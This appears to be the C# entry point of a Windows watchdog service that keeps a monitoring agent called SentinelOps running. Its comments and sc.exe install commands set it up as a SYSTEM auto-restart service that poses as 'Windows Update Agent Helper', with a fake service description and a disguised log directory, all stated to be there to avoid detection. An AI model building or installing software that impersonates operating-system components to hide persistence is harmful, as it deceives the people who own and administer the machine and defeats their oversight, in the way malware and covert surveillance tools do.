using Microsoft.Extensions.DependencyInjection;
using Microsoft.Extensions.Hosting;
using Serilog;
using Serilog.Events;

namespace SentinelWatchdog;

/// <summary>
/// SentinelOps Anti-Tamper Watchdog Service
/// 
/// Purpose: Monitor and automatically restart the main SentinelOps agent if terminated.
/// Disguised as: "Windows Update Agent Helper" to avoid detection.
/// 
/// Architecture:
/// - Runs as separate Windows service with SYSTEM privileges
/// - Independent process lifecycle from main agent
/// - Logs to SYSTEM-only path to prevent tampering
/// - Reports tamper events to backend for audit trail
/// 
/// Installation:
/// - sc.exe create "WUAgentHelper" binPath="C:\Path\To\WUAgentWatchdog.exe"
/// - sc.exe description "WUAgentHelper" "Maintains Windows Update agent components"
/// - sc.exe config "WUAgentHelper" start=auto
/// - sc.exe failure "WUAgentHelper" reset=86400 actions=restart/60000/restart/60000/restart/60000
/// - sc.exe start "WUAgentHelper"
/// </summary>
public class Program
{
    public static int Main(string[] args)
    {
        // Configure Serilog for SYSTEM-only logging
        var logPath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData),
            "Microsoft",
            "Windows",
            "SystemCache", // Disguised log directory
            "WUAgentHelper.log"
        );

        // Ensure log directory exists
        var logDir = Path.GetDirectoryName(logPath);
        if (!string.IsNullOrEmpty(logDir) && !Directory.Exists(logDir))
        {
            try
            {
                Directory.CreateDirectory(logDir);
            }
            catch
            {
                // Fallback to temp directory if creation fails
                logPath = Path.Combine(Path.GetTempPath(), "WUAgentHelper.log");
            }
        }

        Log.Logger = new LoggerConfiguration()
            .MinimumLevel.Information()
            .MinimumLevel.Override("Microsoft", LogEventLevel.Warning)
            .MinimumLevel.Override("System", LogEventLevel.Warning)
            .Enrich.FromLogContext()
            .Enrich.WithMachineName()
            .Enrich.WithEnvironmentUserName()
            .WriteTo.Console(
                outputTemplate: "[{Timestamp:HH:mm:ss} {Level:u3}] {Message:lj}{NewLine}{Exception}")
            .WriteTo.File(
                logPath,
                rollingInterval: RollingInterval.Day,
                retainedFileCountLimit: 7,
                outputTemplate: "{Timestamp:yyyy-MM-dd HH:mm:ss.fff zzz} [{Level:u3}] {Message:lj}{NewLine}{Exception}",
                shared: true,
                flushToDiskInterval: TimeSpan.FromSeconds(1))
            .CreateLogger();

        try
        {
            Log.Information("🛡️ SentinelOps Watchdog starting...");
            Log.Information("Log path: {LogPath}", logPath);
            Log.Information("OS: {OS}", Environment.OSVersion);
            Log.Information("Runtime: {Runtime}", Environment.Version);

            CreateHostBuilder(args).Build().Run();

            Log.Information("Watchdog stopped cleanly");
            return 0;
        }
        catch (Exception ex)
        {
            Log.Fatal(ex, "Watchdog terminated unexpectedly");
            return 1;
        }
        finally
        {
            Log.CloseAndFlush();
        }
    }

    public static IHostBuilder CreateHostBuilder(string[] args) =>
        Host.CreateDefaultBuilder(args)
            .UseWindowsService(options =>
            {
                options.ServiceName = "WUAgentHelper";
            })
            .UseSerilog()
            .ConfigureServices((hostContext, services) =>
            {
                services.AddHttpClient();
                services.AddHostedService<WatchdogService>();
            });
}
